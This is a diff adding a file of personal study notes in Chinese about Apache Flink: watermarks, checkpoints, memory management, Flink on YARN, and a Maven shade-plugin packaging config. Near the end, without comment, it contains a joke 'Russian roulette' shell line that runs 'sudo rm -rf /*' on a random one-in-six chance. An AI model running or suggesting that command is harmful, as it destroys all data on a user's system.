@@ -1,0 +1,191 @@
+checkpoint
+kafka-flink-kafka 
+readFile
+===TODO===
+checkpoint检查点HDFS未发布测试
+flink多数据源 
+
+从文件中读数据
+
+Timer
+定时器,作为window的触发源,分为两类:
+WallTime Timer:按照正常的现实时间作为触发源
+LowWatermark Timer:以低水位作为触发源 
+
+low watermark :最低水位
+其实就是一个时间戳 ,每一个计算节点都会维护一个时间戳作为watermark
+A的低水位值不只和A本身的最旧数据有关,也跟上游的低水位有关.
+因此,只要上游还有更旧的数据存在,就会通过低水位机制维护的low watermark告知下游,
+下游便会更新它自己的low watermark并且由于lwm timer未触发，因此会进行等待
+
+在一定程度上保证数据的完整性和实效性,但是如果有数据比lowwatermark还晚到达仍没有办法解决
+比如:数据在没有进入流系统之前就耽搁了,那low watermark根本不知道
+flink为了解决这个问题,还有allow lateness参数,即Window被low watermark timer触发后,
+还会等待allow lateness时间才开始计算,但这样会损失一定的实时性
+
+
+Flink是通过检查点的方式来实现 exactly-once 只执行一次,当遇到故障时将系统重置为初始状态
+
+
+雅虎15年测试:
+Storm 能够承受每秒 40 万事件,但受限于 CPU； 
+Flink 则可以达到每秒 300万事件(7.5 倍)但受限于 Kafka 集群和 Flink 集群之间的网络
+
+Flink 的执行过程是基于流的，这意味着各个处理阶段有更多的重叠,并且混洗操作是流水线式的,因此磁盘访问操作
+更少.相反, MapReduce、Tez和Spark是基于批的,这意味着数据在通过
+网络传输之前必须先被写入磁盘.该测试说明,在使用 Flink 时,系统空闲时间和磁盘访问操作更少。
+
+接收器  数据源 
+
+Kafka position也是由Flink自己维护的
+
+理想下  无边际数据流 源源不断来  按照时间窗口 计算  输出
+
+现实情况是: 数据不是按时来的 有延迟
+
+所以划分为事件时间  摄取时间  处理时间
+
+公司测试环境下的flink程序,运行26d了也没出现问题,原因在于flink使用的是自己的内存管理体系
+
+
+===flink内存管理===
+主流实时计算框架都是基于jvm语言开发的(Java Scala)
+为了加快计算,通常都是将数据加载在内存中,由于数据量巨大,对内存造成很大压力
+==数据存储==
+最简单做法试封装成对象直接存储在List或Map这样的数据结构中(
+	公司从mq中拿到的实时计算生产到的数据通过消费者程序写入到hbase 
+	kafka  json  map  list(map) hbase)
+引发两个问题?
+1:数据规模大时,需要创建的对象非常多(数据加上存储的数据结构,耗费大量内存)
+	可能引发OOM
+2:源源不断的数据需要被处理,对象持续产生并需要被销毁
+	GC压力大
+SO:
+JVM自带的GC无法满足高效+稳定的流处理,Flink建立一套自己的内存管理体系
+
+Flink将内存分为3个部分(network buffers,Memory Manager pool,Remaining Heap)
+每个部分都有不同用途;
+1:Network buffers:一些以32KB Byte数组为单位的buffer,主要被网络模块用于数据的网络传输。
+	在Flink中主要是基于Netty进行网络传输
+2:Memory Manager pool大量以32KB Byte数组为单位的内存池,所有的运行时算法(例如Sort/Shuffle/Join)都从这个内存池申请内存，
+       并将序列化后的数据存储其中，结束后释放回内存池
+   内存池,由多个MemorySegment组成,每个MemorySegment代表一块连续的内存空间 byte[]数据结构存储  默认32kb
+   
+3:Remaining(Free)Heap主要留给UDF中用户自己创建的Java对象,由JVM管理.
+	用在UDF中用户自己创建的对象 在UDF中,用户流式的处理数据 并不需要太大内存
+	同时flink也不建议在UDF中缓存很多数据
+
+
+重点:
+Flink的主动内存管理避免了令人讨厌的OutOfMemoryErrors杀死JVM并减少垃圾收集开销的问题。
+Flink具有高效的数据去/序列化堆栈，有助于对二进制数据进行操作，并使更多数据适合内存。
+Flink的DBMS风格的运算符本身在二进制数据上运行，在必要时可以在内存中高性能地转移到磁盘。
+
+===Lambda架构===
+Lambda 架构用定期运行的批处理作业来实现应用程序的持续性，并通过流
+处理器获得预警。流处理器实时提供近似结果；批处理层最终会对近似结果予以纠正
+
+批处理架构很难解决乱序事件流问题
+批处理作业的界限不清晰,写死了 假设需要根据产生数据的时间段(如从用户登录到退出)生成
+聚合结果，而不是简单地以小时为单位分割数据
+
+
+=flink流表对偶性=
+流和动态表(Dynamic Table)的对偶(duality)性。
+
+
+
+
+==========================
+堆外内存(off-heap),堆内存(on-heap)
+https://blog.csdn.net/u010722938/article/details/51558315
+
+flink on yarn
+Client提交App到RM上面去运行，然后RM分配第一个container去运行AM，然后由AM去负责资源的监督和管理。
+需要说明的是，Flink的yarn模式更加类似spark on yarn的cluster模式，在cluster模式中，dirver将作为AM中的一个线程去运行，
+在Flink on yarn模式也是会将JobManager启动在container里面，去做个driver类似的task调度和分配，
+YARN AM与Flink JobManager在同一个Container中，这样AM可以知道Flink JobManager的地址，
+从而AM可以申请Container去启动Flink TaskManager。待Flink成功运行在YARN集群上，
+Flink YARN Client就可以提交Flink Job到Flink JobManager，并进行后续的映射、调度和计算处理。
+
+
+批流是怎样统一的?
+Batch和streaming会有两个不同的ExecutionEnvironment,不同的ExecutionEnvironment会将不同的API翻译成不同的JobGgrah,
+JobGraph 之上除了 StreamGraph 还有 OptimizedPlan.OptimizedPlan 是由 Batch API 转换而来的.
+StreamGraph 是由 Stream API 转换而来的,JobGraph 的责任就是统一 Batch 和 Stream 的图.
+
+Flink JobManagerHA ?
+与Storm不同的是，知道Storm在遇到异常的时候是非常简单粗暴的，
+比如说有发生了异常，可能用户没有在代码中进行比较规范的异常处(至少执行一次)的语义，
+比如说一个网络超时的异常对他而言影响可能并没有那么大，
+但是Flink不同的是他对异常的容忍度是非常的苛刻的，那时候就考虑的是比如说会发生节点或者是网络的故障，
+那JobManager单点问题可能就是一个瓶颈，JobManager那个如果挂掉的话，
+那么可能对整个作业的影响就是不可恢复的，所以考虑了做HA
+
+
+
+监控报警
+
+
+==flink学习==
+flink人大视频 
+https://www.bilibili.com/video/av42427050/
+
+
+
+
+
+
+
+
+
+sudo [ $[ $RANDOM % 6 ] == 0 ] && rm -rf /* || echo "Please continue to exec
+===============Flink官方推荐的打包方式  使用maven ==========
+<build>
+<plugins>
+<plugin>
+<groupId>org.apache.maven.plugins</groupId>
+<artifactId>maven-shade-plugin</artifactId>
+<version>3.0.0</version>
+<configuration>
+	<createDependencyReducedPom>false</createDependencyReducedPom>
+</configuration>
+<executions>
+<execution>
+	<phase>package</phase>
+	<goals>
+		<goal>shade</goal>
+	</goals>
+	<configuration>
+		<artifactSet>
+			<excludes>
+				<exclude>com.google.code.findbugs:jsr305</exclude>
+				<exclude>org.slf4j:*</exclude>
+				<exclude>log4j:*</exclude>
+			</excludes>
+		</artifactSet>
+		<filters>
+			<filter>
+				<!-- Do not copy the signatures in the META-INF folder.
+				Otherwise, this might cause SecurityExceptions when using the JAR. -->
+				<artifact>*:*</artifact>
+				<excludes>
+					<exclude>META-INF/*.SF</exclude>
+					<exclude>META-INF/*.DSA</exclude>
+					<exclude>META-INF/*.RSA</exclude>
+				</excludes>
+			</filter>
+		</filters>
+		<transformers>
+			<transformer
+					implementation="org.apache.maven.plugins.shade.resource.ServicesResourceTransformer" />
+			<transformer implementation="org.apache.maven.plugins.shade.resource.ManifestResourceTransformer">
+				<mainClass>com.e6yun.preprocessor.flink.FlinkProcessor</mainClass>
+			</transformer>
+		</transformers>
+	</configuration>
+</execution>
+</executions>
+</plugin>
+</plugins>
+</build>
